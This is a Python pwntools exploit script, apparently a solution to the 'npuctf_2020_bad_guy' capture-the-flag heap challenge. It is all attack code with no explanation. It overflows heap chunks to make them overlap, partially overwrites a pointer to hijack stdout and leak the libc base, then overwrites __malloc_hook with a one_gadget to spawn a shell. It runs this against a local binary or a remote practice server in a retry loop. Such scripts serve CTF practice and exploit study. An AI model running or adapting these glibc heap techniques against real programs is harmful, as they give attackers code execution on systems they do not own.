#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
close = lambda :p.close()

context.log_level = 'debug'

p = process("./npuctf_2020_bad_guy")
def menu(cmd):
	sla(">> ",str(cmd))

def add(idx,size,content):
	menu(1)
	sla("Index :",str(idx))
	sla("size: ",str(size))
	sla("Content:",content)

def edit(idx,size,content):
	menu(2)
	sla("Index :",str(idx))
	sla("size: ",str(size))
	sla("content:",content)

def delete(idx):
	menu(3)
	sla("Index :",str(idx))

def pwn():
	###chunk overlapping###
	add(0,0x60,'aaaaa')
	add(1,0x80,'bbbbb')
	add(2,0x60,'ccccc')
	add(3,0x30,'ddddd')
	add(4,0x60,'/bin/sh')

	fake_size = 0x80 + 0x10 + 0x60 + 0x10 + 0x30 + 0x11
	payload = 'A' * 0x60 + p64(0) + p64(fake_size) + 'A' * 0x80
	payload+= p64(0) + p64(0x71) + 'b' * 0x60
	payload+= p64(0) + p64(0X41) + 'C' * 0x30
	payload+= p64(fake_size)

	edit(0,len(payload),payload)

	delete(2)
	delete(3)
	delete(1)

	###hijack stdout###
	add(1,0x80,'BBBB')#make main_arena in fastbin 0x70
	payload = 'B' * 0x80 + p64(0) + p64(0x71) + '\xdd' + '\x15' 
	edit(1,len(payload),payload)#overflow to modify main_arena low 2 bytes

	add(2,0x60,'')#fastbin
	payload = 'A' * 0x33 + p64(0xfbad1887) + p64(0) * 3 + '\0'
	add(3,0x60,payload)#stdout

	libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))  - 0x3c3260
	success('libc base:'+hex(libc_base))

	###malloc_hook###
	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	system = libc_base + libc.symbols['system']
	one_gadget = libc_base + 0xf1147

	delete(2)
	payload = 'B' * 0x80 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
	edit(1,len(payload),payload)#overflow to modify fd to get free_hook

	add(2,0x60,'ccccc')
	payload = 'A' * 0x13 + p64(one_gadget) 
	add(9,0x60,payload)

while True:
	global p
	if(sys.argv[1] == 'l'):
		p = process("./npuctf_2020_bad_guy")
		elf = ELF("./npuctf_2020_bad_guy")
		libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	else:
		p = remote('node3.buuoj.cn',25903)
		elf = ELF("./npuctf_2020_bad_guy")
		libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	
	try:
		pwn()
		
		ia()
	except:
		close()
